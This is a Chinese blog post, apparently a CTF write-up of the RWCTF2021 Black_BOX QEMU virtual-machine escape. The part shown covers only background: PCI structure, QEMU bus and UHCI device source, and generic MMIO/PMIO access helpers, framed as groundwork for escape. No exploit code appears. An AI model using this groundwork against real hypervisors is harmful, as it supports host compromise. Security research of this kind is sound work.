<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="0x01 前言虚拟机逃逸，通过利用虚拟机程序本身存在的漏洞，我们可以控制虚拟机程序在宿主机上执行任意代码。虚拟机虚拟出各种设备给guest系统使用，这些虚拟设备只是虚拟机程序中的一个模块，如果这些设备存在漏洞，便可以利用起来进行逃逸。 0x02 PCI设备">
<meta property="og:type" content="article">
<meta property="og:title" content="黑盒虚拟机逃逸RWCTF2021 Black_BOX">
<meta property="og:url" content="https://github.com/2022/01/28/RWCTF2021-Black-BOX/index.html">
<meta property="og:site_name" content="ha1vk&#39;s blog">
<meta property="og:description" content="0x01 前言虚拟机逃逸，通过利用虚拟机程序本身存在的漏洞，我们可以控制虚拟机程序在宿主机上执行任意代码。虚拟机虚拟出各种设备给guest系统使用，这些虚拟设备只是虚拟机程序中的一个模块，如果这些设备存在漏洞，便可以利用起来进行逃逸。 0x02 PCI设备">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://p2.ssl.qhimg.com/t0199d1e4172018dfc9.jpg">
<meta property="og:image" content="https://p3.ssl.qhimg.com/t019dc660426bcc29c2.png">
<meta property="og:image" content="https://p4.ssl.qhimg.com/t012c6970f98cead0ac.png">
<meta property="og:image" content="https://p1.ssl.qhimg.com/t017713016bcee27324.png">
<meta property="og:image" content="https://p3.ssl.qhimg.com/t01c51863315469b28b.png">
<meta property="article:published_time" content="2022-01-28T01:21:09.000Z">
<meta property="article:modified_time" content="2025-06-26T10:19:50.787Z">
<meta property="article:author" content="ha1vk">
<meta property="article:tag" content="QEMU">
<meta property="article:tag" content="虚拟机逃逸">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://p2.ssl.qhimg.com/t0199d1e4172018dfc9.jpg">

<link rel="canonical" href="https://github.com/2022/01/28/RWCTF2021-Black-BOX/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>黑盒虚拟机逃逸RWCTF2021 Black_BOX | ha1vk's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ha1vk's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/2022/01/28/RWCTF2021-Black-BOX/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ha1vk">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ha1vk's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          黑盒虚拟机逃逸RWCTF2021 Black_BOX
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-28 09:21:09" itemprop="dateCreated datePublished" datetime="2022-01-28T09:21:09+08:00">2022-01-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>虚拟机逃逸，通过利用虚拟机程序本身存在的漏洞，我们可以控制虚拟机程序在宿主机上执行任意代码。虚拟机虚拟出各种设备给guest系统使用，这些虚拟设备只是虚拟机程序中的一个模块，如果这些设备存在漏洞，便可以利用起来进行逃逸。<br><img src="https://p2.ssl.qhimg.com/t0199d1e4172018dfc9.jpg"></p>
<h2 id="0x02-PCI设备"><a href="#0x02-PCI设备" class="headerlink" title="0x02 PCI设备"></a>0x02 PCI设备</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>不管是虚拟设备还是实体硬件设备，都是遵循了设备的定义规范的，PCI设备的内存布局如下<br><img src="https://p3.ssl.qhimg.com/t019dc660426bcc29c2.png"><br>注册一个设备，事实上就是将这样的内存布局初始化完成。在qemu中，硬件的初始化是从<code>pc_init1</code>函数开始的，并且PIC总线也是在这里开始初始化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/* PC hardware initialisation */</span><br><span class="line">static void pc_init1(MachineState *machine,</span><br><span class="line">                     const char *host_type, const char *pci_type)</span><br><span class="line">&#123;</span><br><span class="line">    PCMachineClass *pcmc = PC_MACHINE_GET_CLASS(pcms);</span><br><span class="line">..........</span><br><span class="line">    if (pcmc-&gt;pci_enabled) &#123; //pci总线可用</span><br><span class="line">        PIIX3State *piix3;</span><br><span class="line"></span><br><span class="line">        pci_bus = i440fx_init(host_type,</span><br><span class="line">                              pci_type,</span><br><span class="line">                              &amp;i440fx_state,</span><br><span class="line">                              system_memory, system_io, machine-&gt;ram_size,</span><br><span class="line">                              x86ms-&gt;below_4g_mem_size,</span><br><span class="line">                              x86ms-&gt;above_4g_mem_size,</span><br><span class="line">                              pci_memory, ram_memory);</span><br><span class="line">        pcms-&gt;bus = pci_bus;</span><br><span class="line"></span><br><span class="line">        piix3 = piix3_create(pci_bus, &amp;isa_bus);</span><br><span class="line">        piix3-&gt;pic = x86ms-&gt;gsi;</span><br><span class="line">        piix3_devfn = piix3-&gt;dev.devfn;</span><br><span class="line">    &#125; else &#123; //ISA总线</span><br><span class="line">.........</span><br></pre></td></tr></table></figure>
<p>可见qemu使用的主板型号是<code>i440fx</code>，在i440fx_init函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PCIBus *i440fx_init(const char *host_type, const char *pci_type,</span><br><span class="line">                    PCII440FXState **pi440fx_state,</span><br><span class="line">                    MemoryRegion *address_space_mem,</span><br><span class="line">                    MemoryRegion *address_space_io,</span><br><span class="line">                    ram_addr_t ram_size,</span><br><span class="line">                    ram_addr_t below_4g_mem_size,</span><br><span class="line">                    ram_addr_t above_4g_mem_size,</span><br><span class="line">                    MemoryRegion *pci_address_space,</span><br><span class="line">                    MemoryRegion *ram_memory)</span><br><span class="line">&#123;</span><br><span class="line">    DeviceState *dev;</span><br><span class="line">    PCIBus *b;</span><br><span class="line">    PCIDevice *d;</span><br><span class="line">    PCIHostState *s;</span><br><span class="line">    PCII440FXState *f;</span><br><span class="line">    unsigned i;</span><br><span class="line">    I440FXState *i440fx;</span><br><span class="line"></span><br><span class="line">    dev = qdev_new(host_type); //创建PIC主总线设备</span><br><span class="line">    s = PCI_HOST_BRIDGE(dev);</span><br><span class="line">    b = pci_root_bus_new(dev, NULL, pci_address_space,</span><br><span class="line">                         address_space_io, 0, TYPE_PCI_BUS); //创建PIC总线</span><br><span class="line">    s-&gt;bus = b;</span><br></pre></td></tr></table></figure>
<p>有了PIC总线以后，就可以将多种PIC设备挂到这个总线设备上了，每个PIC设备以一个模块的形式存在，qemu在启动时会根据启动参数去加载对应的模块。在qemu中，初始化函数通过调用<code>pci_qdev_register</code>函数将设备挂到PCI总线上。并通过<code>module_init</code>将初始化函数添加到设备候选列表中以供qemu启动参数选择设备。<br><img src="https://p4.ssl.qhimg.com/t012c6970f98cead0ac.png"><br>PCI设备的结构实例可以通过查看文件<code>/sys/devices/pci0000:00/0000:XX:YY.Z/resource</code>，其中XX为PCI总线号，YY为PCI设备号，Z为PCI功能号，每条总线最多可以挂载32个设备，每个设备最多提供8个功能。<br>可以通过<code>lspci -k</code>命令来查看系统中当前的PCI设备。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ # lspci -k</span><br><span class="line">00:01.2 Class 0c03: 8086:7020 uhci_hcd</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010 ata_piix</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>
<p>以<code>uhci_hcd</code>这个设备为例，其设备资源路径为<code>/sys/devices/pci0000:00/0000:00:01.2/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ # ls /sys/devices/pci0000:00/0000:00:01.2/</span><br><span class="line">ari_enabled               enable                    rescan</span><br><span class="line">broken_parity_status      irq                       resource</span><br><span class="line">class                     local_cpulist             resource4</span><br><span class="line">config                    local_cpus                revision</span><br><span class="line">consistent_dma_mask_bits  modalias                  subsystem</span><br><span class="line">d3cold_allowed            msi_bus                   subsystem_device</span><br><span class="line">device                    numa_node                 subsystem_vendor</span><br><span class="line">dma_mask_bits             pools                     uevent</span><br><span class="line">driver                    power                     usb1</span><br><span class="line">driver_override           remove                    vendor</span><br></pre></td></tr></table></figure>
<p>其中的config文件对应了前面的PCI结构图</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/ # xxd  -g 1 /sys/devices/pci0000:00/0000:00:01.2/config</span><br><span class="line">00000000: 86 80 20 70 07 01 00 00 01 00 03 0c 00 00 00 00  .. p............</span><br><span class="line">00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000020: 41 c0 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11  A...............</span><br><span class="line">00000030: 00 00 00 00 00 00 00 00 00 00 00 00 0b 04 00 00  ................</span><br><span class="line">00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000060: 10 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00  ................</span><br><span class="line">00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000c0: 00 20 00 00 00 00 00 00 00 00 00 00 00 00 00 00  . ..............</span><br><span class="line">000000d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br></pre></td></tr></table></figure>
<p>从结构空间上来看，每个PCI设备最多允许6个<code>Base Address Register</code>，每个BAR记录了该设备映射的一段地址空间，当最后1bit为0时，代表这这映射的是<code>IO内存</code><br><img src="https://p1.ssl.qhimg.com/t017713016bcee27324.png"><br>当最后1bit为1时，代表这映射的是<code>IO端口</code><br><img src="https://p3.ssl.qhimg.com/t01c51863315469b28b.png"><br>从数据中可以知道，改设备注册了一个BAR，其下标为4，类型为<code>IO端口</code>，并且可以看到在设备目录下存在一个resource4文件与之对应。<br>同时，我们可以通过查看resource文件获得当前设备所有的BAR对应资源的起始地址、结束地址、flags</p>
<p><code>/ # cat /sys/devices/pci0000:00/0000:00:01.2/resource 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x000000000000c040 0x000000000000c05f 0x0000000000040101 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000</code></p>
<p>我们可以知道这个设备的IO端口地址为<code>0x000000000000c040</code></p>
<h3 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h3><p>当一个BAR的资源类型为<code>IO内存</code>时，我们可以使用mmap去映射这段内存，然后就可以通过向这段内存写入或读取数据，来与设备进行交互。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:XX:YY.Z/resource0&quot;, O_RDWR | O_SYNC);</span><br><span class="line">if (mmio_fd == -1)</span><br><span class="line">    die(&quot;mmio_fd open failed&quot;);</span><br><span class="line"> </span><br><span class="line">mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);</span><br><span class="line">if (mmio_mem == MAP_FAILED)</span><br><span class="line">    die(&quot;mmap mmio_mem failed&quot;);</span><br></pre></td></tr></table></figure>

<h3 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h3><p>当一个BAR的资源类型为<code>IO端口</code>时，我们需要使用指令<code>in</code>和<code>out</code>来向端口地址处读取或写入来进行交互。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint32_t pmio_port = 0xc040;</span><br><span class="line">​</span><br><span class="line">uint32_t pmio_write(uint32_t addr, uint32_t value)</span><br><span class="line">&#123;</span><br><span class="line">    outl(value,pmio_port+addr);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">uint32_t pmio_read(uint32_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    return (uint32_t)inl(pmio_port+addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-UHCI-Universal-Host-Controller-Interface"><a href="#0x03-UHCI-Universal-Host-Controller-Interface" class="headerlink" title="0x03 UHCI(Universal Host Controller Interface)"></a>0x03 UHCI(Universal Host Controller Interface)</h2><p>UHCI是Intel主导的对USB1.0、1.1的接口标准，UHCI是比较老的标准，新的标准有EHCI对应USB2.0，XHCI对应USB3.0，每个标准都有一个对应的硬件控制器，并且属于PCI设备，在qemu中也有对应的实现。在hcd-uhci.c中，首先是将设备注册函数添加到全局设备表中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">static void uhci_register_types(void)</span><br><span class="line">&#123;</span><br><span class="line">    TypeInfo uhci_type_info = &#123;</span><br><span class="line">        .parent        = TYPE_UHCI,</span><br><span class="line">        .class_init    = uhci_data_class_init,</span><br><span class="line">    &#125;;</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    type_register_static(&amp;uhci_pci_type_info);</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; ARRAY_SIZE(uhci_info); i++) &#123;</span><br><span class="line">        uhci_type_info.name = uhci_info[i].name;</span><br><span class="line">        uhci_type_info.class_data = uhci_info + i;</span><br><span class="line">        type_register(&amp;uhci_type_info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(uhci_register_types)</span><br></pre></td></tr></table></figure>
<p>该设备的初始化函数为<code>uhci_data_class_init</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">void uhci_data_class_init(ObjectClass *klass, void *data)</span><br><span class="line">&#123;</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">    UHCIPCIDeviceClass *u = container_of(k, UHCIPCIDeviceClass, parent_class);</span><br><span class="line">    UHCIInfo *info = data;</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = info-&gt;realize ? info-&gt;realize : usb_uhci_common_realize;</span><br><span class="line">    k-&gt;exit = info-&gt;unplug ? usb_uhci_exit : NULL;</span><br><span class="line">    k-&gt;vendor_id = info-&gt;vendor_id;</span><br><span class="line">    k-&gt;device_id = info-&gt;device_id;</span><br><span class="line">    k-&gt;revision  = info-&gt;revision;</span><br><span class="line">    if (!info-&gt;unplug) &#123;</span><br><span class="line">        /* uhci controllers in companion setups can&#x27;t be hotplugged */</span><br><span class="line">        dc-&gt;hotpluggable = false;</span><br><span class="line">        device_class_set_props(dc, uhci_properties_companion);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        device_class_set_props(dc, uhci_properties_standalone);</span><br><span class="line">    &#125;</span><br><span class="line">    if (info-&gt;notuser) &#123;</span><br><span class="line">        dc-&gt;user_creatable = false;</span><br><span class="line">    &#125;</span><br><span class="line">    u-&gt;info = *info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数初始化PCI设备的一些基本信息，然后<code>k-&gt;realize</code>函数将在设备进行实例化时被调用，其中<code>usb_uhci_common_realize</code>函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">void usb_uhci_common_realize(PCIDevice *dev, Error **errp)</span><br><span class="line">&#123;</span><br><span class="line">    Error *err = NULL;</span><br><span class="line">    PCIDeviceClass *pc = PCI_DEVICE_GET_CLASS(dev);</span><br><span class="line">    UHCIPCIDeviceClass *u = container_of(pc, UHCIPCIDeviceClass, parent_class);</span><br><span class="line">    UHCIState *s = UHCI(dev);</span><br><span class="line">    uint8_t *pci_conf = s-&gt;dev.config;</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    pci_conf[PCI_CLASS_PROG] = 0x00;</span><br><span class="line">    /* TODO: reset value should be 0. */</span><br><span class="line">    pci_conf[USB_SBRN] = USB_RELEASE_1; /* release number */</span><br><span class="line">    pci_config_set_interrupt_pin(pci_conf, u-&gt;info.irq_pin + 1);</span><br><span class="line">    s-&gt;irq = pci_allocate_irq(dev);</span><br><span class="line"></span><br><span class="line">    if (s-&gt;masterbus) &#123;</span><br><span class="line">        USBPort *ports[NB_PORTS];</span><br><span class="line">        for(i = 0; i &lt; NB_PORTS; i++) &#123;</span><br><span class="line">            ports[i] = &amp;s-&gt;ports[i].port;</span><br><span class="line">        &#125;</span><br><span class="line">        usb_register_companion(s-&gt;masterbus, ports, NB_PORTS,</span><br><span class="line">                               s-&gt;firstport, s, &amp;uhci_port_ops,</span><br><span class="line">                               USB_SPEED_MASK_LOW | USB_SPEED_MASK_FULL,</span><br><span class="line">                               &amp;err);</span><br><span class="line">        if (err) &#123;</span><br><span class="line">            error_propagate(errp, err);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        usb_bus_new(&amp;s-&gt;bus, sizeof(s-&gt;bus), &amp;uhci_bus_ops, DEVICE(dev));</span><br><span class="line">        for (i = 0; i &lt; NB_PORTS; i++) &#123;</span><br><span class="line">            usb_register_port(&amp;s-&gt;bus, &amp;s-&gt;ports[i].port, s, i, &amp;uhci_port_ops,</span><br><span class="line">                              USB_SPEED_MASK_LOW | USB_SPEED_MASK_FULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s-&gt;bh = qemu_bh_new(uhci_bh, s);</span><br><span class="line">    s-&gt;frame_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, uhci_frame_timer, s);</span><br><span class="line">    s-&gt;num_ports_vmstate = NB_PORTS;</span><br><span class="line">    QTAILQ_INIT(&amp;s-&gt;queues);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;io_bar, OBJECT(s), &amp;uhci_ioport_ops, s,</span><br><span class="line">                          &quot;uhci&quot;, 0x20);</span><br><span class="line"></span><br><span class="line">    /* Use region 4 for consistency with real hardware.  BSD guests seem</span><br><span class="line">       to rely on this.  */</span><br><span class="line">    pci_register_bar(&amp;s-&gt;dev, 4, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;io_bar);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
